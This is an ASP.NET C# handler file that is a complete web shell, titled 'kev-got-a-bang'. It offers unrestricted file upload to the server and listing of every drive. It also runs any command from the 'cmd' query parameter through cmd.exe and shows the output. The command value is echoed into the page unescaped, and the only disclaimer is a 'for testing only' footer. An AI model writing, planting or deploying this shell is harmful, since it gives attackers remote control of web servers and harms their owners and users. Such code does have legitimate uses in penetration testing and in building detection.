<% @ webhandler language="C#" class="AverageHandler" %>

using System;
using System.Web;
using System.Diagnostics;
using System.IO;

public class AverageHandler : IHttpHandler
{
    public bool IsReusable
    {
        get { return true; }
    }

    public void ProcessRequest(HttpContext ctx)
    {
        // locate processing 
		string uploadFolderPath = "~/uploads/"; // path file to upload
		string command = ctx.Request.QueryString["cmd"]; // check cmd
		string drive = ctx.Request.QueryString["drive"]; // directory geter
        if (ctx.Request.HttpMethod == "POST" && ctx.Request.Files.Count > 0)
        {
            for (int i = 0; i < ctx.Request.Files.Count; i++)
            {
                HttpPostedFile file = ctx.Request.Files[i];
                
                if (file.ContentLength > 0)
                {
                    string fileName = Path.GetFileName(file.FileName);
                    string filePath = HttpContext.Current.Server.MapPath(uploadFolderPath + fileName); 
                    file.SaveAs(filePath);
                    ctx.Response.Write("File uploaded successfully. File path: " + filePath + "<br>");
                }
            }
        }
		
        // Upload
		ctx.Response.Write(@"
			<html>
			<head>
			<title>kev-got-a-bang</title>
				<style>
					body {
						font-family: Arial, sans-serif;
						margin: 20px;
					}
					form {
						margin-bottom: 20px;
					}
					input[type='file'] {
						margin-right: 10px;
					}
					pre {
						white-space: pre-wrap;
					}
				</style>
			</head>
			<body>
				<h1>File Upload and Command Execution</h1>
				<form method='POST' enctype='multipart/form-data'>
					<label for='fileUpload'>Select a file to upload:</label>
					<input type='file' name='fileUpload' />
					<input type='submit' value='Upload File' />
				</form>

				<form method='GET'>
					<label for='cmd'>Enter a command to run:</label>
					<input type='text' size='200' name='cmd' value='" + command + @"'>
					<input type='submit' value='Run'>
				</form>
				<hr>
				<pre>");

        // Directory listing
		ctx.Response.ContentType = "text/html";
		DriveInfo[] allDrives = DriveInfo.GetDrives();
		ctx.Response.Write("<h2>Directory Listing:</h2>");
		foreach (DriveInfo d in allDrives)
		{
			ctx.Response.Write("<a href='?drive=" + d.Name + "'>" + d.Name + "</a><br>");
		}

		ctx.Response.Write("<hr>");

		// directory
		if (!string.IsNullOrEmpty(drive))
		{
			ctx.Response.Write("<h2>The content in " + drive + ":</h2>");
			try
			{
				string[] files = Directory.GetFiles(drive);
				foreach (string file in files)
				{
					ctx.Response.Write(file + "<br>");
				}
			}
			catch (Exception ex)
			{
				ctx.Response.Write("Cannot access " + drive + ": " + ex.Message);
			}
		}

	ctx.Response.Write("<hr>");

	// command execution
        if (!string.IsNullOrEmpty(command))
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + command;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            StreamReader stmrdr = p.StandardOutput;
            string s = stmrdr.ReadToEnd();
            stmrdr.Close();
			
            ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));
        }
		
		ctx.Response.Write(@"</pre>
				<hr>
				<p>i'm here to <a href=https://github.com/nvth>help</a></p>
				<p>for testing only</p>
			</body>
			</html>");
    }
}
